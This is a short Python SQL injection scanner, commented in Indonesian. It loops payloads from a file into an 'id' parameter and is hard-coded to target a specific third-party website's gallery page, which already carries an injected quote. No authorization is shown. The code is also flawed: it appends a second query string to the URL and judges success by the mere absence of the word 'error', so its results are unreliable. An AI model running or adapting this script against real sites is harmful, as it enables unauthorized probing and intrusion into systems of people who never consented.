import requests
import json

def load_payloads(file_path):
    """Load SQL injection payloads from a file."""
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def test_sql_injection(url, payloads):
    results = []
    
    for payload in payloads:
        test_url = f"{url}?id={payload}"
        response = requests.get(test_url)

        if "error" not in response.text.lower() and response.status_code == 200:
            result = {
                "payload": payload,
                "response": response.text[:200],  # Menampilkan sebagian dari response
                "url": test_url
            }
            results.append(result)
            print(f"Potential SQL Injection vulnerability found with payload: {payload}")
            print(f"Response: {response.text[:200]}...")
        else:
            print(f"No vulnerability found with payload: {payload}")

    return results

def save_results(results, output_file):
    """Save results to a JSON file."""
    with open(output_file, 'w') as file:
        json.dump(results, file, indent=4)
    print(f"Results saved to {output_file}")

if __name__ == "__main__":
    target_url = "https://www.dunavgrocka.rs/en/galery.php?id=2%27"  # Ganti dengan URL target Anda
    payload_file = "payloads.txt"  # File yang berisi payload
    output_file = "results.json"  # File untuk menyimpan hasil

    # Memuat payload dari file
    payloads = load_payloads(payload_file)

    # Menguji SQL Injection
    results = test_sql_injection(target_url, payloads)

    # Menyimpan hasil
    if results:
        save_results(results, output_file)
